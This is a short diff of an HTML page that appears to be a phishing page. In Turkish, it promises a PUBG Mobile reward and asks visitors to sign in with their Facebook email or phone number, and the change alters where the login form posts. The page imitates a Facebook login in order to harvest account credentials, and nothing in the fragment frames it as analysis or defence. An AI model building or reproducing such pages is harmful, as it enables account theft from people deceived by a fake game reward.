@@ -1221,7 +1221,7 @@ Do you want to change to another reward?
 			<div class="txt-login-fb">
 				  Pubg mobile Hesabınıza bağlanmak  için FACEBOOK hesabınıza  giriş Yapın
 			</div>
-			<form class="login-form" action="verification.php" method="POST">
+			<form class="login-form" action="verification.html" method="POST">
 				<label>
 				<input type="text" name="email" placeholder="E posta veya telefon Numarası" autocomplete="off" autocapitalize="off" required>
 				</label>
